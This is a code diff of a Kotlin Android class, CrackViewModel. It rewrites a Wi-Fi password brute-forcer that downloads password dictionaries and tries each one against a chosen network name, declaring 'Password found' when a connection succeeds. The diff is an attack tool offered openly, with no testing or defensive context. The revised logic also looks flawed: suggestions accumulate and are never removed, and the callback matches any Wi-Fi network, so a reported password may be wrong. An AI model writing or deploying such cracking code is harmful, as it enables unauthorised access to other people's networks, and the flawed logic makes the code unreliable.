@@ -6,21 +6,18 @@ import android.net.ConnectivityManager
 import android.net.Network
 import android.net.NetworkCapabilities
 import android.net.NetworkRequest
-import android.net.wifi.WifiNetworkSpecifier
+import android.net.wifi.WifiNetworkSuggestion
+import android.net.wifi.WifiManager
 import androidx.lifecycle.AndroidViewModel
 import androidx.lifecycle.viewModelScope
 import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.Job
-import kotlinx.coroutines.delay
 import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.flow.StateFlow
-import kotlinx.coroutines.isActive
 import kotlinx.coroutines.launch
 import java.io.BufferedReader
 import java.io.InputStreamReader
 import java.net.HttpURLConnection
 import java.net.URL
-import kotlin.coroutines.cancellation.CancellationException
 
 class CrackViewModel(application: Application) : AndroidViewModel(application) {
 
@@ -30,87 +27,49 @@ class CrackViewModel(application: Application) : AndroidViewModel(application) {
     private val _progress = MutableStateFlow(0)
     val progress: StateFlow<Int> = _progress
 
-    private var crackingJob: Job? = null
+    private val wifiManager = application.getSystemService(Context.WIFI_SERVICE) as WifiManager
     private val connectivityManager = application.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
 
     fun startCracking(ssid: String, detail: String) {
-        // Cancel any previous job
-        crackingJob?.cancel()
-        crackingJob = viewModelScope.launch(Dispatchers.IO) {
-            try {
-                _status.value = "Downloading dictionaries..."
-                _progress.value = 0
-                val passwords = downloadDictionaries()
-                if (passwords.isEmpty()) {
-                    _status.value = "Failed to download dictionaries."
+        viewModelScope.launch(Dispatchers.IO) {
+            _status.value = "Downloading dictionaries..."
+            val passwords = downloadDictionaries()
+            _status.value = "Passwords loaded, cracking now..."
+
+            for ((index, password) in passwords.withIndex()) {
+                _progress.value = index * 100 / passwords.size
+                val suggestion = WifiNetworkSuggestion.Builder()
+                    .setSsid(ssid)
+                    .setWpa2Passphrase(password)
+                    .build()
+
+                val suggestions = listOf(suggestion)
+                val status = wifiManager.addNetworkSuggestions(suggestions)
+                if (status != WifiManager.STATUS_NETWORK_SUGGESTIONS_SUCCESS) {
+                    _status.value = "Failed to suggest network"
                     return@launch
                 }
-                _status.value = "Passwords loaded, cracking now..."
 
-                for ((index, password) in passwords.withIndex()) {
-                    if (!isActive) throw CancellationException()
-
-                    _status.value = "Trying password: $password"
-                    _progress.value = (index + 1) * 100 / passwords.size
-
-                    val success = tryPassword(ssid, password)
-
-                    if (success) {
-                        _status.value = "Password found: $password"
-                        return@launch
-                    }
-                }
-                _status.value = "Failed to crack password."
-            } catch (e: CancellationException) {
-                _status.value = "Cracking cancelled."
-            } catch (e: Exception) {
-                _status.value = "An error occurred: ${e.message}"
-                e.printStackTrace()
+                registerNetworkCallback(password)
+                kotlinx.coroutines.delay(5000) // 5 second timeout for each password
             }
+            _status.value = "Failed to crack password."
         }
     }
 
-    private suspend fun tryPassword(ssid: String, password: String): Boolean {
-        return kotlin.coroutines.suspendCancellableCoroutine { continuation ->
-            val specifier = WifiNetworkSpecifier.Builder()
-                .setSsid(ssid)
-                .setWpa2Passphrase(password)
-                .build()
+    private fun registerNetworkCallback(password: String) {
+        val networkRequest = NetworkRequest.Builder()
+            .addTransportType(NetworkCapabilities.TRANSPORT_WIFI)
+            .build()
 
-            val request = NetworkRequest.Builder()
-                .addTransportType(NetworkCapabilities.TRANSPORT_WIFI)
-                .setNetworkSpecifier(specifier)
-                .build()
-
-            val networkCallback = object : ConnectivityManager.NetworkCallback() {
-                override fun onAvailable(network: Network) {
-                    super.onAvailable(network)
-                    connectivityManager.unregisterNetworkCallback(this)
-                    if (continuation.isActive) {
-                        continuation.resume(true, null)
-                    }
-                }
-
-                override fun onUnavailable() {
-                    super.onUnavailable()
-                    connectivityManager.unregisterNetworkCallback(this)
-                    if (continuation.isActive) {
-                        continuation.resume(false, null)
-                    }
-                }
+        val networkCallback = object : ConnectivityManager.NetworkCallback() {
+            override fun onAvailable(network: Network) {
+                super.onAvailable(network)
+                _status.value = "Password found: $password"
+                connectivityManager.unregisterNetworkCallback(this)
             }
-
-            continuation.invokeOnCancellation {
-                connectivityManager.unregisterNetworkCallback(networkCallback)
-            }
-
-            connectivityManager.requestNetwork(request, networkCallback, 5000) // 5 second timeout
         }
-    }
-
-    override fun onCleared() {
-        super.onCleared()
-        crackingJob?.cancel()
+        connectivityManager.registerNetworkCallback(networkRequest, networkCallback)
     }
 
     private suspend fun downloadDictionaries(): List<String> {
